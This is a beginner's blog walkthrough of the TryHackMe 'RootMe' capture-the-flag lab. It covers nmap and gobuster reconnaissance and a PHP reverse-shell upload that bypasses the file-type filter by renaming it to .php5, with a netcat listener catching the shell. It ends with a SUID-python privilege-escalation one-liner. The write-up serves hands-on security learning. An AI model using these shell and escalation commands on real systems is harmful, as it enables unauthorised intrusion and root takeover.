---
title: TryHackMe RootMe Walkthrough
published: 2021-04-02
lastUpdated: 2022-11-06
type: post
url: /tryhackme-rootme/
image: "https://p146.p4.n0.cdn.getcloudapp.com/items/5zuPx46m/9393a1b2-5bae-4db3-a53e-d87c254adaa4.jpg?v=6f2c17b6b25f92419e0c317a9e3655c6"
categories:
    - Cyber
tags:
    - TryHackMe
    - Capture The Flag
    - Walkthrough
    - 100DaysOfHacking
---

I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.

This is a beginner ‘easy’ game, their description reads *a CTF for beginners, can you root me?* If you’re unaware, root means top-level access, like super admin or master-of-everything.

When you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours.

Let’s get started on RootMe

## Reconnaissance

First up, let’s *scan the machine, how many ports are open?*

```shell
$ nmap -A -p- $ip # CTRL+C - Took too long.

$ nmap -T4 -A $ip

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

```

So, second `nmap` scan found `2` ports open, `ssh` &amp; `http`. Great, so that tells me it’s a web server, a non-secure one at that, and it’s able to have remote connection.

Next, *what version of Apache is running?*

Our scan has already pulled that information, `2.4.29`. I’m thinking maybe I could look this verion up and find known exploit.

*What service is running on port 22?*

Easy again, got that from scan, `ssh.`

*Find directories on the web server using the GoBuster tool. Hint: `gobuster dir -u <ip> -w WORDLIST_PATH`.*

Hm, this is a new tool, let’s first `man` it and see if I have it on `kali`.

```shell
$ man gobuster # Not found.

$ sudo apt install gobuster

$ gobuster --help

$ apt-cache show gobuster

Directory/file & DNS busting tool written in Go Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains.

```

So it’s `ls` but for enurmeration? Cool.

After reading [kali tools](https://tools.kali.org/web-applications/gobuster), I’ve got a wordlist to use, let’s go!

```shell
$ gobuster dir -u 10.10.173.20 -w /usr/share/wordlists/dirb/common.txt

/.hta
/.htpasswd
/.htaccess
/css
/index.php
/js
/panel # upload page
/server-status
/uploads

```

While that’s running, I remembered I can go to `<ip>` to view frontend of the website… Nothing there, just a game landing page.

Now the scan has finished, let’s try each page of the website via going `<ip>/<page>`. Normal stuff accept the `/panel` page. Strange file upload and gives a spanish error msg, a bit odd, I’ll remember this for later.

…or right now, w*hat is the hidden directory?* `/panel/`

## Getting A Shell

Okay, now it’s about shell access, i.e. stepping into the machine and gaining basic level access.

Let’s read the question, *find a form to upload and get a **reverse shell**, and find the flag.* Hint: *Search for “**file upload bypass**” and “**PHP reverse shell**“.*

Cool, first time using a reverse shell, still unsure what/how of this, but let’s learn by searching first recommendation.

File upload bypass, means, due to poor validation (secuirty) allows uploaded files to run by user or server.

Searching `PHP reverse shell` shows what looks like a [popular github page](https://github.com/pentestmonkey/php-reverse-shell). Let’s `git clone` it and take look.

```shell
$ mkrdir TryHackMe-rootme

$ git clone <https://github.com/pentestmonkey/php-reverse-shell.git> TryHackMe-rootme

$ nano php-reverse-shell.php

```

I’m taking the time to read the program (usually I don’t). It’s recommending to go to [pentestmonkey.net](http://pentestmonkey.net/) for help, looks like a great resource!

So `netcat` needs to be running to listen and ‘catch’ the reverse shell. Cool. Let’s setup `nc`, edit and upload the file

```shell
$ip = '10.10.10.10';  // CHANGE THIS
$port = 4444;       // CHANGE THIS

$ sudo nc -vlnp 4444

```

After tinkering around, not sure why, but the file extension of the reverse shell file had to be changed from `.php` to `.php5` … my guess is this tells the website it’s PHP version 5 which it can work with? Not 100% sure.

I started cheating by the way from this [video](https://youtu.be/eDGI1RCkp8E). Just to get past this step.

Once the reverse shell was uploaded, I went to `<ip>/uploads/` to execute the file and `nc` picked it up, wow! My heart actually dropped a bit, like this is remote access from an uploaded file. WTH!

So I had to cheat a bit more on this one, annoying as I could’ve figured it out if I had more patience.

```shell
$ find / -type f -name user.txt 2>/dev/null

/var/ww/user.txt

$ cat /var/ww/user.txt

THM{*************************}

```

## Privilege Escalation

*Now that we have a shell, let’s escalate our privileges to root.*

Cool. Let’s go.

*Search for files with SUID permission, which file is weird?*

```shell
$ find / -user root -perm /4000 2>/dev/null

```

This is hard, I’m not sure what I’m looking for.

I used the input field from TryHackMe `/***/***/******` and just guessed which directory’s based on characters, `/usr/bin/python`.

Okay, next, *find a form to escalate your privileges, search for gtfobins.*

Found [gtfobins](https://gtfobins.github.io/), searched python and looked for SUID.

…time passes.

Look, I’ll be honest, I’ve got root and I have no idea what made it happen. I don’t understand python so it seems like magic right now. Anyway, here are the steps I took (or followed):

```shell
$ /bin/bash

python -c 'import pty;pty.spawn ("/bin/bash")'

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

```

Now I’ve got the `#` let’s search for the missing file.

```shell
$ find / -type f -name root.txt 2>/dev/null

/root/root.txt

$ cat /root/root.txt

THM{*************************}

```

Well, that’s the last flag, we did it! Thanks to [Yesspider](https://youtu.be/eDGI1RCkp8E) for their walkthrough video.

Looking back this is a good beginner game, even if it felt really hard and lead me to cheat, I use the term ‘cheating’ loosely as it’s still learning. If I get so stuck I want to give up, it’s better to look at a walkthrough than stop altogether.

I’m getting comfortable running some `nmap` which is great, and then sifting through information to find what I’m after.

I learnt about `gobuster`, a tool I want to use more! It felt great using a reverse shell and understanding the concept even if I didn’t understand 100% of what I was following along with. Something about setting up `nc` to listen and catch information felt amazing!

I loved used `find` one of the most basic commands which still havent clicked for me. Lastly using Python, now to be honest all of that went right over my head. But I’m using it, being more familiar, so it’s a start!

Hope you enjoyed this CTF Walkthrough.

If you have feedback, please send me a message via [Twitter](https://twitter.com/mrashleyball).

This is Day 6 of [\#100DaysOfHacking](https://mrash.co/100daysofhacking/), subscribe to the [newsletter](https://go.mrash.co/newsletter) to see the journey!

Happy Hacking.